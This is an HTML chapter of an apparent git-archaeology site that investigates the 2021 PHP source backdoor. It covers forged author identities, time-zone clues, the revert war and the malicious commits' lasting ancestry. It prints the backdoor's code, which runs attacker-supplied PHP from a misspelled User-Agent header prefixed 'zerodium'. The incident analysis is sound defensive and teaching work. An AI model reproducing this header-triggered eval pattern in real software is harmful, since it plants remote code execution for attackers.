@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en" data-theme-default="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Fix typo — Blame</title>
+<meta name="description" content="The complete dig: the eleven-line payload, the timezone and Signed-off-by tells, the revert war, and why the backdoor is still an ancestor of every PHP 8.1+ checkout.">
+<link rel="stylesheet" href="../static/style.css">
+<script src="../static/theme.js"></script>
+</head>
+<body>
+<header class="site-header"><div class="row">
+  <a class="brand" href="../index.html"><b>git blame</b> · Blame</a>
+  <nav class="site-nav"><a href="../index.html">contents</a><a href="../about.html">method</a><button class="theme-toggle" type="button">☾ dark</button></nav>
+</div></header>
+<main class="wrap">
+<p class="kicker">chapter <b>12</b> · full dig · repo <b>php/php-src</b> · the backdoor signed by the founder</p>
+<h1>Fix typo</h1>
+<p><em>This is the full dig — every command, every receipt. The plain-English telling of the same story is here: <a href="12-php.html">Fix typo</a>.</em></p>
+<pre><span class="lang">console</span><code><span class="tok-prompt">$</span> git -C repos/php show -s --format=fuller c730aa26bd
+commit c730aa26bd52829a49f2ad284b181b7e82a68d7d
+Author:     Rasmus Lerdorf &lt;rasmus@lerdorf.com&gt;
+AuthorDate: Sun Mar 28 05:57:07 2021 +0200
+Commit:     Rasmus Lerdorf &lt;rasmus@lerdorf.com&gt;
+
+    [skip-ci] Fix typo
+
+    Fixes minor typo.
+
+    Signed-off-by: Rasmus Lerdorf &lt;rasmus@lerdorf.com&gt;</code></pre>
+<p>If you stop at the header, this is the most ordinary object in the repository. Rasmus Lerdorf created PHP; a commit from him fixing a typo in the language he invented is as unremarkable as it gets, down to the <code>[skip-ci]</code> tag that tells the build servers not to waste time testing a one-character change. <a class="receipt-ref" href="#r1">R1</a> Here is the change:</p>
+<pre><span class="lang">console</span><code><span class="tok-prompt">$</span> git -C repos/php show c730aa26bd -- ext/zlib/zlib.c | grep -E '^\+' | grep -vE '^\+\+\+'
++	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || ...
++		(enc = zend_hash_str_find(..., "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
++		convert_to_string(enc);
++		if (strstr(Z_STRVAL_P(enc), "zerodium")) {
++			zend_try {
++				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
++			} zend_end_try();
++		}
++	}</code></pre>
+<p><a class="receipt-ref" href="#r2">R2</a> Read it in three steps. First, when a request comes in, PHP looks for a header named <code>User-Agentt</code> — with a doubled T. The doubled T is not the typo; it is a name close enough to the real <code>User-Agent</code> to slide past a reading eye, and one that no ordinary browser will ever send. Second, if that header's value begins with the word <code>zerodium</code>, the code takes everything after those eight characters — <code>+8</code> — and hands it to <code>zend_eval_string</code>. Third, <code>zend_eval_string</code> runs it, as PHP, on the server.</p>
+<p>Those eleven lines are a remote-code-execution backdoor. They entered PHP's main development branch under its founder's name, beneath <em>Fix typo</em> and <code>[skip-ci]</code>.</p>
+<h2>The tells</h2>
+<p>That <code>Signed-off-by: Rasmus Lerdorf</code> line is a formal trailer — the I-vouch-for-this that kernel developers live by. How often does the real Rasmus use it?</p>
+<pre><span class="lang">console</span><code><span class="tok-prompt">$</span> git -C repos/php log --all --author=Rasmus --grep='Signed-off-by' --format='%H %aI %ae %s'
+c730aa26bd52829a49f2ad284b181b7e82a68d7d 2021-03-28T05:57:07+02:00 rasmus@lerdorf.com [skip-ci] Fix typo</code></pre>
+<p><a class="receipt-ref" href="#r3">R3</a> Once. In twenty-two years and hundreds of commits, the only time "Rasmus Lerdorf" ever signed off on anything is this one.</p>
+<p>The email is genuinely his, though — <code>rasmus@lerdorf.com</code>, on many real commits. Look at when those were made:</p>
+<pre><span class="lang">console</span><code><span class="tok-prompt">$</span> git -C repos/php log --all --author='rasmus@lerdorf.com' --format='%aI %s' | head -4
+2026-03-19T04:12:45-04:00 Fix GH-21411: opcache_compile_file() fails to early-bind...
+2021-03-28T05:57:07+02:00 [skip-ci] Fix typo
+2019-10-23T14:34:12-07:00 Reverting push to wrong repo
+2019-05-21T14:47:28-07:00 Merge branch 'PHP-7.4'</code></pre>
+<p><a class="receipt-ref" href="#r4">R4</a> Rasmus commits from American time zones — <code>-04:00</code>, <code>-07:00</code>. This one is <code>+0200</code>, Central European, at 05:57 on a Sunday. One line in that list was typed from a different continent than every other line, by someone whose own clock came stamped on the object. I do not need the news to tell me what that means, and neither do you: <code>git blame</code> on those eleven lines would print <code>Rasmus Lerdorf</code>, and <code>git blame</code> is wrong.</p>
+<h2>11:16</h2>
+<p>Five hours and change after the push, at 11:16 that same Sunday morning, a maintainer named Nikita Popov is looking at a <code>[skip-ci] Fix typo</code> from the language's founder, and does not take it at its word. What he does next is the closest thing to a contemporaneous statement the history holds:</p>
+<pre><span class="lang">console</span><code><span class="tok-prompt">$</span> git -C repos/php show -s --format=fuller 046827a7e8
+Author:     Nikita Popov &lt;nikita.ppv@gmail.com&gt;
+
+    Revert "[skip-ci] Fix typo"
+
+    This looks like the result of a compromised git account. Commit
+    access has already been revoked.</code></pre>
+<p><a class="receipt-ref" href="#r5">R5</a> The code is undone. The account is revoked. <em>Already</em> — past tense, handled. For seven hours that reads like the end of it: an intruder got in under Rasmus's name, was caught, locked out, and the payload rolled back before any release could carry it. Then, at 18:15:</p>
+<pre><span class="lang">console</span><code><span class="tok-prompt">$</span> git -C repos/php show -s --format='%an &lt;%ae&gt;  %s' 2b0f239b21
+Nikita Popov &lt;nikita.ppv@gmail.com&gt;  Revert "Revert "[skip-ci] Fix typo""</code></pre>
+<p><a class="receipt-ref" href="#r6">R6</a> A commit undoing Nikita's revert — putting the backdoor back — authored as Nikita. The name on the restoration is the name of the person who, that morning, revoked the attacker's access. Give that a second. And it is the same code returning, not a variant; you do not have to trust the subject line, because the trees match to the byte:</p>
+<pre><span class="lang">console</span><code><span class="tok-prompt">$</span> git -C repos/php rev-parse 'c730aa26^{tree}' '2b0f239b^{tree}'
+a1c87b3d3dcea24d3f232a65345b66c4968a6ed3
+a1c87b3d3dcea24d3f232a65345b66c4968a6ed3</code></pre>
+<p><a class="receipt-ref" href="#r6">R6</a> Same tree hash means same code, exactly. Locked out under one identity, the intruder came back under another — the responder's own. This is the moment the incident stops being about a stolen password and becomes something colder: inside the log, a name has stopped being evidence. The reader who would have trusted <code>Author: Rasmus Lerdorf</code> has now watched <code>Author: Nikita Popov</code> fail the same way. It is not a second forger. It is the same string, worn twice.</p>
+<p>Ninety minutes later a third developer, Levi Morrison, reverted the revert of the revert, and the door stayed shut. Four commits, one Sunday: plant, revert, replant, revert. You cannot find that war by searching the log for what it was about — the word <code>zerodium</code> is in none of the subject lines, and <code>git log --grep=zerodium</code> across the whole repository returns nothing. <a class="receipt-ref" href="#r7">R7</a> To see it, you search the diffs themselves:</p>
+<pre><span class="lang">console</span><code><span class="tok-prompt">$</span> git -C repos/php log --all -S zerodium --format='%h %aI %an %s' -- ext/zlib/zlib.c
+8d743d5281c 2021-03-28T11:53:17-06:00 Levi Morrison Revert "Revert "Revert "[skip-ci] Fix typo"""
+2b0f239b211 2021-03-28T18:15:57+02:00 Nikita Popov Revert "Revert "[skip-ci] Fix typo""
+046827a7e86 2021-03-28T11:16:39+02:00 Nikita Popov Revert "[skip-ci] Fix typo"
+c730aa26bd5 2021-03-28T05:57:07+02:00 Rasmus Lerdorf [skip-ci] Fix typo</code></pre>
+<p><a class="receipt-ref" href="#r7">R7</a> Four subjects, a tower of quotation marks around the word "typo." The incident is one layer down, in the contents.</p>
+<h2>Still an ancestor</h2>
+<p>The payload was reverted twice and never shipped in a release. The compromised server was abandoned soon after. Five years have passed. So the two malicious commits surely are not part of the PHP you would install today — ask:</p>
+<pre><span class="lang">console</span><code><span class="tok-prompt">$</span> git -C repos/php merge-base --is-ancestor c730aa26bd HEAD &amp;&amp; echo 'c730aa26: ANCESTOR of HEAD'
+c730aa26: ANCESTOR of HEAD
+<span class="tok-prompt">$</span> git -C repos/php merge-base --is-ancestor 2b0f239b21 HEAD &amp;&amp; echo '2b0f239b: ANCESTOR of HEAD'
+2b0f239b: ANCESTOR of HEAD</code></pre>
+<p><a class="receipt-ref" href="#r8">R8</a> Both of them, still there.</p>
+<p class="beat">A revert removes the change from the tree. It does not remove the change from the graph.</p>
+<p>A revert is not a deletion; it is a new commit that undoes an old one, and both remain reachable forever. The backdoor's code is gone from the working tree — <em>not active</em>, it does nothing — but the commit that added it is an ancestor of current HEAD, which means every clone of PHP made since March 2021, every release of PHP 8.1 and later on every server it runs on, carries the zerodium commit in its ancestry. PHP could have erased it by rewriting history, but rewriting changes every hash downstream, breaks every checkout in the world, and would itself be a kind of forgery — pretending the tree was never touched. They let it stand. The receipt for this chapter is in your own <code>vendor</code> directory right now.</p>
+<p>Two habits, then, before the last object. When identity actually matters — a supply-chain question you will get asked — treat the <code>Author</code> field as a claim and check it against the person's own record: <code>git log --format='%aI %ae'</code> for a time zone that matches their every other commit, <code>git log --author=&lt;name&gt; --grep='Signed-off-by'</code> for a habit that appears once. And when you read that a repository was compromised and cleaned, run <code>merge-base --is-ancestor</code> on the bad commit yourself; "cleaned" almost always means reverted, and reverted means still in there.</p>
+<h2>The locks</h2>
+<p>The reverts removed the payload. But the backdoor was possible because of <em>where</em> PHP lived: its canonical source was the project's own server, <code>git.php.net</code>, with GitHub only a mirror, and that server had password accounts that could be — and were — taken over. The day after:</p>
+<pre><span class="lang">console</span><code><span class="tok-prompt">$</span> git -C repos/php show 49a20cf3db -- README.md | grep -E '^[+-]' | grep -iE 'git.php.net|mirror' | head -3
+-[git.php.net](https://git.php.net). Contributions are most welcome by forking
+-the [GitHub mirror repository](https://github.com/php/php-src) and sending a
+-Pull requests are not merged directly on GitHub. All PRs will be pulled and</code></pre>
+<p><a class="receipt-ref" href="#r9">R9</a> <code>git.php.net</code> is struck out of the documentation. The word <em>mirror</em> goes with it. The project gave up the twenty-year-old server it controlled and moved its true home to GitHub, where accounts carry two-factor keys — a real cost, self-hosted independence traded away, and the actual casualty of the attack, since the payload itself never reached a user. The newest commit in the repository is now committed not by any developer's key but by <code>GitHub</code> itself. <a class="receipt-ref" href="#r10">R10</a></p>
+<p>The most important commit after a break-in is rarely the fix. It is the one that changes the locks.</p>
+<div class="receipts"><h2>receipts</h2><ul><li id="r1"><span class="rid">R1</span> <code>git -C repos/php show -s --format=fuller c730aa26bd</code> — "[skip-ci] Fix typo," authored and committed as Rasmus Lerdorf, 2021-03-28 05:57 +0200, with a <code>Signed-off-by: Rasmus Lerdorf</code> trailer.</li><li id="r2"><span class="rid">R2</span> <code>git -C repos/php show c730aa26bd -- ext/zlib/zlib.c</code> — the 11-line payload: if the <code>HTTP_USER_AGENTT</code> header value starts with <code>zerodium</code>, <code>zend_eval_string(...+8, ...)</code> executes the remainder; diagnostic string "sold to zerodium, mid 2017."</li><li id="r3"><span class="rid">R3</span> <code>git -C repos/php log --all --author=Rasmus --grep='Signed-off-by'</code> — the backdoor is the only <code>Signed-off-by</code> commit "Rasmus Lerdorf" ever made in the repository.</li><li id="r4"><span class="rid">R4</span> <code>git -C repos/php log --all --author='rasmus@lerdorf.com' --format='%aI %s'</code> — real Rasmus commits are −04:00/−07:00; the backdoor is +0200 at 05:57 on a Sunday.</li><li id="r5"><span class="rid">R5</span> <code>git -C repos/php show -s --format=fuller 046827a7e8</code> — Nikita Popov's revert, 11:16 same day: "This looks like the result of a compromised git account. Commit access has already been revoked."</li><li id="r6"><span class="rid">R6</span> <code>git -C repos/php show -s 2b0f239b21</code> + <code>rev-parse 'c730aa26^{tree}' '2b0f239b^{tree}'</code> — the 18:15 re-plant is authored as Nikita himself; both malicious commits share tree <code>a1c87b3d3d…</code>.</li><li id="r7"><span class="rid">R7</span> <code>git -C repos/php log --all -S zerodium -- ext/zlib/zlib.c</code> + <code>log --grep=zerodium | wc -l</code> — the four-commit revert war surfaces only on a content pickaxe; the word never appears in any commit message (0).</li><li id="r8"><span class="rid">R8</span> <code>git -C repos/php merge-base --is-ancestor c730aa26 HEAD</code> (and <code>2b0f239b</code>) — both malicious commits are ancestors of current HEAD; never rewritten out.</li><li id="r9"><span class="rid">R9</span> <code>git -C repos/php show 49a20cf3db -- README.md</code> — 2021-03-29: "Removed mentions of git.php.net from the documentation"; the canonical-remote and <em>mirror</em> language is deleted.</li><li id="r10"><span class="rid">R10</span> <code>git -C repos/php log -1 --format='%h %aI committer=%cn &lt;%ce&gt;'</code> — the newest commit is committed by <code>GitHub &lt;noreply@github.com&gt;</code>: the migration to the two-factor forge, complete.</li></ul><p class="regen">Every command above is reproducible against a fresh clone. Full transcripts and the regenerate script sit beside this chapter in the repository.</p></div>
+<div class="chapter-foot"><a href="../index.html">← contents</a><a href="../about.html">how to check this →</a></div>
+</main>
+<footer class="site-footer"><div class="wrap">Blame — git archaeology. Every hash is real; clone the repo and run the command.</div></footer>
+</body>
+</html>
